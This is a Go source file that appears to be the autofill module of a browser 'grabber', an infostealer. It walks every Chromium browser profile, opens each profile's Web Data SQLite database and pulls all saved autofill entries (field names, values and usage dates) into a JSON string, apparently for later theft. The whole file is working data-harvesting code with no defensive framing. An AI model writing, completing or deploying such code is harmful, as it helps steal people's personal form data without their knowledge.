package autofill

import (
	"database/sql"
	"encoding/json"
	"kdot/grabber/browsers/chromium/structs"
)

type Autofill struct {
	Name           string `json:"name"`
	Value          string `json:"value"`
	Value_lower    string `json:"value_lower"`
	Date_created   string `json:"date_created"`
	Date_last_used string `json:"date_last_used"`
	Count          string `json:"count"`
}

func Get(browsersList []structs.Browser) string {
	var autofill []Autofill
	for _, browser := range browsersList {
		for _, profile := range browser.Profiles {
			path := profile.WebData

			db, err := sql.Open("sqlite3", path)
			if err != nil {
				continue
			}
			defer db.Close()

			row, err := db.Query("SELECT name, value, value_lower, date_created, date_last_used, count FROM autofill")
			if err != nil {
				continue
			}
			defer row.Close()

			for row.Next() {
				var name string
				var value string
				var value_lower string
				var date_created string
				var date_last_used string
				var count string
				row.Scan(&name, &value, &value_lower, &date_created, &date_last_used, &count)
				autofill = append(autofill, Autofill{name, value, value_lower, date_created, date_last_used, count})
			}
		}
	}
	jsonData, err := json.MarshalIndent(autofill, "", "    ")
	if err != nil {
		return ""
	}
	return string(jsonData)
}
